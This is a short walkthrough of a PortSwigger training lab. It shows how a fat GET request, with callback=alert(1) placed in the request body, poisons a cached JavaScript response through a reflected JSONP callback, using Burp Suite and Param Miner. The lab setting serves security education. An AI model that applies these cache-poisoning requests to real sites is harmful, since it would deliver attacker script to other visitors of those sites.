# [Web cache poisoning via a fat GET request](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

- open the lab in burp browser
- go to `Target` -> `Site map`
- send the `/js/geolocate.js?callback=setCountryCookie` to the repeater
- send the request
- check if it is a cache oracle (it is)
- lets find a cachebuster (there are other cachebusters in the app tho)
- the query changes caches the response
- it will respond with a couple js function

```
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
setCountryCookie({"country":"United Kingdom"});
```

- since the setCountryCookie is in the request's query, lets try it with a different one

```
GET /js/geolocate.js?callback=alert(1) HTTP/2
...
```

```
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1)({"country":"United Kingdom"});
```

- so the request query appears in the response
- but even if this cached no user will call the specifically
- the `callback=alert(1)` needs to be hidden in the query parameters
- start a Param Miner (extension) on the request to check what query params might be unkeyed
- `Extensions` -> `Param Miner` -> `Guess Query`
- it will give back NOTHING this time
- wtf to do now
- lets try a fat GET

> what is fat GET

- it has excessive adipose tissue
- so the request has more content in the body

```
GET /js/geolocate.js?callback=setCountryCookieX HTTP/2
...
callback=alert(1)
```

- send the request
- the response has the same exploit
- lets take out the "X" from the cachebuster

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
...
callback=alert(1)
```

- the request have to formatted properly
- send it again, until the it get cached
